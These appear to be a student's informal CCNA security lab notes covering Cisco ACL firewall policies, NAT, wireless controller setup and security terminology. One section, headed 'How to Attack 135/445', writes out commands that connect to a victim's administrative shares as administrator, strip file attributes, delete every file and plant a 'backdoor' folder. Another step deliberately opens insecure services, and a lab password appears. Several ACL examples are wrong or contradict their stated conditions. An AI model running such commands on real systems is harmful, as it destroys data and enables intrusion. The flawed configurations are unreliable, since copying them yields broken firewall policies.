#

@CoreBABA:
show ip int brief
"dapat 4 and IP, UP UP"
show ip dhcp binding

@CUCM
"DAPAT WORKING PHONE"
ping 10.m.100.8
ping.51.51.1
ping 200.0.0.m
ping 200.0.0.k
ping 10.51.1.10
 

ping 200.0.0.52

@PC:
ping 10.31.1.4

IPV6
a:c::
::0
fe80::a:0:f
2002:6500:0:3000::
::1
ff00::beef:a00a:aa0:0:

Task 1 
@Edge: 
config t
no access-list 1
access-list 1 permit 10.11.0.0 0.0.255.255
access-list 1 permit 10.21.0.0 0.0.255.255
access-list 1 permit 10.31.0.0 0.0.255.255
access-list 1 permit 10.41.0.0 0.0.255.255
access-list 1 permit 10.51.0.0 0.0.255.255


int gi0/0/1
ip access-Group 1 in
do sh access-list 1

@Edge: 
config t
no access-list 2
access-list 2 permit 10.11.0.0 0.0.255.255
access-list 2 permit 10.21.0.0 0.0.255.255
access-list 2 permit 10.31.0.0 0.0.255.255
access-list 2 permit 10.41.0.0 0.0.255.255
access-list 2 permit 10.51.0.0 0.0.255.255

int gi0/0/1
ip access-Group 2 in
do sh access-list 2






CMD
How to Attack 135/445 of your victim:
cmd
net use \\10.k.1.10\ipc$ /user:administrator
"command completed successfully" = lahi ng hacker

net use x: \\10.k.1.10\c$

x:dir / ah
   attrib -s-r-h *.*
   del *.*
MKDIR pumasoksi_saBACKDOOR

Task2: CONFIGURING BASIC CISCO FIREWALL
STEP1: MAKE cucm very HACKABLE:
PC: nmap -v 10.51.100.8

@CUCM
config t 
Service tcp-small-servers
service udp-small-servers
service finger
ip dns server
ip http server
ip http secure-server
Int Fa0/0
    ip add 10.51.100.9 255.255.255.0 Secondary
    end

@PC:
ping 10.51.1.10 - PC
ping 


10.51.1.10 pc
10.51.1.4 sw
10.51.100.8 cm
10.51.100.9 cm2
10.51.100.102 p1
10.51.100.101 p2
10.51.51.1 ed
10.51.51.3 ap
C:\Windows\System32\drivers\etc


TASK3: How to secure your company using firewall.
@cucm

ip host cm 10.51.1.10
ip host cm2 10.51.1.10
ip host pc 10.51.1.4
ip host sw 10.51.100.4
ip host p2 10.51.1.102
ip host p1 10.51.1.101

Cybersecurity:
UTM = Unified Threat Management:
firewall
VPNsite2site
er: LogRythim/splunkAntiVirus
IntrusionDetectionSystem/Prevention: ips/ids: SNORT
NAC: network Admission Control
DakilangSumbungero:
SEIM = Security Event Info Manager: LogRythm
PALO ALTO Cybersecurity
CheckPoint Cybersecurity
CISCO ASA/Firepower
FortinetFortigate
Sophos: 


LevelofGreatNess:
godMode: A.I. applicationNextGen firewall
GreatFW: NextGeneration Firewall, statefull
PwedeNa: packetfilter firewall = Cisco Extended ACL

Task5: Make a firewall policy to meet these conditions
cm is a company website, protectIT: 80,443,2000
cm2 is a DNS, and ssh server, protectIT: 53,22

Extended Name Access-list:

@cucm:  PROTOCOL:tcp,udp,IP,icmp HACKER VICTIM PORT

EXAMPLE 1

FP1
config t
no IP access-list extended FP1
IP access-list extended FP1
permit tcp any host cm EQ 80 log
permit tcp any host cm EQ 443 log
permit tcp any host cm EQ 5060 log
permit tcp any host cm2 EQ 53 log
permit tcp any host cm2 EQ 22 log

int fa0/0
    ip access-group FP1 in
    do sh access-list FP1


EXAMPLE 2

make a firewallPolicy to these:
cm is http(80), ssh(22),dns(53) server Only
cm2 is https(443)., telnet(23) ssh(22)

FP2

no IP access-list extended FP2
IP access-list extended FP2
permit tcp any host cm EQ 80 log
permit tcp any host cm EQ 22 log
permit tcp any host cm EQ 53 log
permit tcp any host cm2 EQ 443 log
permit tcp any host cm2 EQ 23 log
permit tcp any host cm2 EQ 22 log

int fa0/0
    ip access-group FP2 in
    do sh access-list FP2

Example3: fired for no reason

int fa0/0
no ip access-group FP2 in



Example4: Create FP3 tp allow:
cm allow: finger,daytime,sccp,sip
cm2 allow: ssh,telnet,dns,ping(icmp,noport)

config t
no IP access-list extended FP3
IP access-list extended FP3
permit tcp any host cm EQ 79 log
permit tcp any host cm EQ 13 log
permit tcp any host cm EQ 2000 log
permit tcp any host cm EQ 5060 log
permit tcp any host cm2 EQ 22 log
permit tcp any host cm2 EQ 23 log
permit tcp any host cm2 EQ 53 log
permit icmp any any

int fa0/0
    ip access-group FP3 in
    do sh access-list FP3

administrator

Example 5(4) create NOLAMON policy to meet this:
cm allow ping, sip, web, secureWeb.
cm2 allow ssh, telnet,dns, sccp, finger.

config t
no IP access-list extended NOLAMON
IP access-list extended NOLAMON
permit icmp any any
permit tcp any host cm EQ 5060 log
permit tcp any host cm EQ 80 log
permit tcp any host cm EQ 443 log
permit tcp any host cm2 EQ 22 log
permit tcp any host cm2 EQ 23 log
permit tcp any host cm2 EQ 80 log
permit tcp any host cm2 EQ 2000 log
permit tcp any host cm2 EQ 79 log

int fa0/0
    ip access-group NOLAMON in
    do sh access-list NOLAMON



EX5 make a policy BREAKTIME
CM open All EvenNumberPorts
cm2 open ping, oddNumberPorts

config t
no IP access-list extended BREAKTIME
IP access-list extended BREAKTIME
permit icmp any any
permit tcp any host cm EQ 5060 log
permit tcp any host cm EQ 80 log
permit tcp any host cm EQ 443 log
permit tcp any host cm2 EQ 22 log
permit tcp any host cm2 EQ 23 log
permit tcp any host cm2 EQ 80 log
permit tcp any host cm2 EQ 2000 log
permit tcp any host cm2 EQ 79 log

int fa0/0
    ip access-group NOLAMON in
    do sh access-list NOLAMON
    =============EDIITTLATER======

Task6: 4th and Final Lab in CCNA EXAM

Network Address Translation

Microsoft = Proxy, Apple = Hotspot, Android = Tethering

@edge:
config t
access-list 8 permit 10.51.0.0 0.0.255.255
int gi 0/0/0
    ip Nat Inside
int gi 0/0/1
ip nat outside
ip nat inside source list 8 int gi 0/0/1 Overload
ip nat inside source static 10.51.1.10 200.0.0.100+51
ip nat inside source static tcp 10.51.1.10 80 200.0.0.100+51 8080

do sh ip nat Translation


Kill@:
stop ping ^c
clear ip nat Translation *
config t

int gi 0/0/0
   no ip Nat Inside
int gi 0/0/1
no ip nat outside


Task7: 15% EXAM. Entering the World of DevOPS
less100k:paYosi vs DevOPS more 100k pa condo pakotse

console             postman APItesting
telnet              Python + JSON
ssh                 ansible +Yaml
VMware              "Dockers"
2linux:8gb,2cp      linux:x200mb x 500



Enterprise Wireless Deployment: 
clear ip dhcp binding *
sh ip dhcp binding

10.51.10.102
10.51.10.103

username: admin
pass: C1sc0123

system name: controller-M
country:PH
date time: as is
time zone: as is

Management ip address: 10.M.10.m
subnetmask 255.255.255.0
DGateway 10.m.10.4
Employee Network:
Network Name: M-WifiFirstname
pass: C1sc0123

Network Security Fundamentals
Security Concepts and Terminologies

Assets: 
Hardwares 
People- Customer Information,
Data
Plans 
Projects
-Compromised
-what we need to defendd

Vulnerabilities
virus
malwares
weakness
can compromised our assets

exploit 
tools
Metasplot
Macflooding
Destroy and compromised assets


Threat
Hacker
Malicious intent




